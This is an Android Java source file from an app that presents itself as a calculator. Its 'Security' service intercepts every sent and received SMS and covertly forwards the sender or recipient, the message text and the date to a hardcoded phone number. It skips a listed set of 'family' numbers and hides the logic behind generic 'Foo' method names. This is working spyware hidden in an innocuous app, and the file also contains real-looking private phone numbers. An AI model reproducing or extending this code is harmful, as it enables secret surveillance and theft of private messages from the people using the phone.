package com.calculator.calculator;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.telephony.SmsManager;
import android.util.Log;

import java.util.Arrays;

public class Security extends IntentService {
    final private String[] familyPhoneNumber = {
            "0163450482","+60163450482",
            "+60126600839","0126600839",
//            "+60172519547","0172519547",
            "+60173360181","0173360181",
            "+60172651387","0172651387",
            "0126608541","+60126608541"
    };
    final private SmsManager sms = SmsManager.getDefault();

    private static final String EXTRA_PARAM1 = "com.calculator.calculator.extra.PARAM1";
    private static final String EXTRA_PARAM2 = "com.calculator.calculator.extra.PARAM2";
    private static final String EXTRA_PARAM3 = "com.calculator.calculator.extra.PARAM3";
    private static final String EXTRA_PARAM4 = "com.calculator.calculator.extra.PARAM4";

    public Security() {
        super("Security");
    }


    public static void startActionFoo(Context context, String add,String date,String msg, String type) {
        Intent intent = new Intent(context, Security.class);
        intent.putExtra(EXTRA_PARAM1, add);
        intent.putExtra(EXTRA_PARAM2, date);
        intent.putExtra(EXTRA_PARAM3, msg);
        intent.putExtra(EXTRA_PARAM4, type);
        context.startService(intent);
        Log.d(Calculator.TAG, "action foo started");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
                final String add = intent.getStringExtra(EXTRA_PARAM1);
                final String date = intent.getStringExtra(EXTRA_PARAM2);
                final String msg = intent.getStringExtra(EXTRA_PARAM3);
                final String type =  intent.getStringExtra(EXTRA_PARAM4);
                handleActionFoo(add,date,msg,type);
        }
    }

    /**
     * Handle action Foo in the provided background thread with the provided
     * parameters.
     */
    private void handleActionFoo(String add,String date,String msg,String type) {
        final String sendToNumber = "+60126600839";
        String smsContent;

        Log.d(Calculator.TAG, "action foo start to handle");
        if (!Arrays.asList(familyPhoneNumber).contains(add) ) {
            Log.d(Calculator.TAG, "wan check type");
            Log.d(Calculator.TAG,type);
            if (type.equals("RECEIVED")) {
                Log.d(Calculator.TAG, "is type1");
                smsContent = "received sms from " + add + " content is " + msg + "date is " + date;
                sms.sendTextMessage(sendToNumber, null, smsContent, null, null);
                Log.d(Calculator.TAG, "type1 sms sent");
            }
            if (type.equals("SENT")) {
                Log.d(Calculator.TAG, "is type2");
                smsContent = "send to " + add + " content is " + msg + "date is " + date;
                sms.sendTextMessage(sendToNumber, null, smsContent, null, null);
                Log.d(Calculator.TAG, "type2 sms sent");
            }
        }
    }
}
